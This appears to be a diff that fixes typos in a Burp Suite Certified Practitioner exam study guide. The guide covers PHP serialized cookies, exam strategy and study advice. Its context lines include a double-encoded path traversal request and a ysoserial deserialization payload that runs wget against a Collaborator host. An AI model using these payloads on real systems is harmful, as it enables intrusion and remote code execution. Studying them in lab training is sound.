@@ -2044,7 +2044,7 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 ### CustomTemplate PHP  
 
->Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scannner identify serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
+>Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scanner identify serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
 
 ![info-disclose](images/info-disclose.png)  
 
@@ -2148,7 +2148,7 @@ java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collabor
   
 ## Approach  
 
->When stuck in BSCP exam, refrence the below [Micah van Deusen blog tip 5 table of category to stages](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/) for ways to progress through the stages.  
+>When stuck in BSCP exam, reference the below [Micah van Deusen blog tip 5 table of category to stages](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/) for ways to progress through the stages.  
 
 ![MicahVanDeusens-blog](images/MicahVanDeusens-blog.png)  
   
@@ -2185,6 +2185,6 @@ Youtube channels:
 
 >My experience so far taking the PortSwigger exam, it is designed to be challenging, it is not straight forward vulnerabilities, twisted challenges, mixed academy labs into single stage and even rabbit holes.  
 >**Perseverance:** Persistence in doing something despite difficulty or delay in achieving success.  
->**OSCP** certification tought me to **#TryHarder** and gave me the foundation penetration testing skills.  
+>**OSCP** certification taught me to **#TryHarder** and gave me the foundation penetration testing skills.  
 >I believe eventually I will pass the **BSCP** exam and it has already given me the next level of web application security analyst knowledge.  
   
